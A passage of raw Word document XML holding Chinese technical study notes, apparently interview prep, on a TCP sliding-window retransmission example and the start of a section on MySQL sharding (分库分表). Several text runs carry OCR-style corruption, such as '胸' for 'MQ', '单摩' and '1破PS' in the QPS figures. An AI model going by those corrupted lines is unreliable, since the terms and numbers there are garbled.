        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>发送160个字节</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Part3, Seq </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>= 201,此包由于其他原因丢失</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="297" w:name="bookmark306"/>
      <w:bookmarkEnd w:id="297"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Client</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>收到前2个报文段，并发送</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ACK </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>= 201</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="298" w:name="bookmark307"/>
      <w:bookmarkEnd w:id="298"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Server </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">发送 140 个字节 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Part4, Seq </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>= 361</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="299" w:name="bookmark308"/>
      <w:bookmarkEnd w:id="299"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>收到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Client</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对于前两个报文段的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>将2个报文从窗口中移除，窗口有</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="715"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="300" w:name="bookmark309"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="300"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。。个字节的余量</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="750"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="301" w:name="bookmark310"/>
      <w:bookmarkEnd w:id="301"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>报文3的重传定时器到期，没有收到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>进行重传</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="750"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="302" w:name="bookmark311"/>
      <w:bookmarkEnd w:id="302"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这个时候</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Client</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>已经收到报文4,存放在緩冲区中，也不会发送</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK ［</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>累计通知， 发送</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就表示3也收到了】,等待报文3,报文3收到之后，一块对3,4进行确认</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="825"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="303" w:name="bookmark312"/>
      <w:bookmarkEnd w:id="303"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>收到确认之后，将报文3,4移除窗口，所有数据发送完成</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>总结就是2中处理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="304" w:name="bookmark313"/>
      <w:bookmarkEnd w:id="304"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>定时器溢出，重传3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="460" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="305" w:name="bookmark314"/>
      <w:bookmarkEnd w:id="305"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>定时器溢出，重传3,4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="306" w:name="bookmark315"/>
      <w:bookmarkStart w:id="307" w:name="bookmark316"/>
      <w:bookmarkStart w:id="308" w:name="bookmark317"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>47. mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>分库分表</w:t>
      </w:r>
      <w:bookmarkEnd w:id="306"/>
      <w:bookmarkEnd w:id="307"/>
      <w:bookmarkEnd w:id="308"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分库分表： 场景：在进行设计数据库时，在用户量不大的情况下单表单库在承载最大</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2000/s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>以下 的请求应该是没有问题的，单表磁盘存儲</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>200w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>已经就够多了。但是如果单表单库的情 况下达到这么高的并发和存储对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数据库的性能有极大的挑战。当业务发展变大可 以进行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>緩存解决一部分查请求并发减少</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>压力值，达到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">阚值可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MQ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>进行削峰，但是这个不是长久的办法，如果业务量再次加大那么前面的措施会极大 的影响程序性能。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="309" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的分库分表用于在高并发大业务量的情况下的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>性能优化。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="309" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分库：在原本的但库的情况下最大能承载的并发量也就</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2000/sQPS,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">万一 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>QPS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>直接到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">lw </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>及以上就算使用胸也会堆积大量数据请求需要处理,这个时候就可以进行数据库分库, 单摩时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2000/sQPS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>那么来5个库就是最高1破</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>PS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
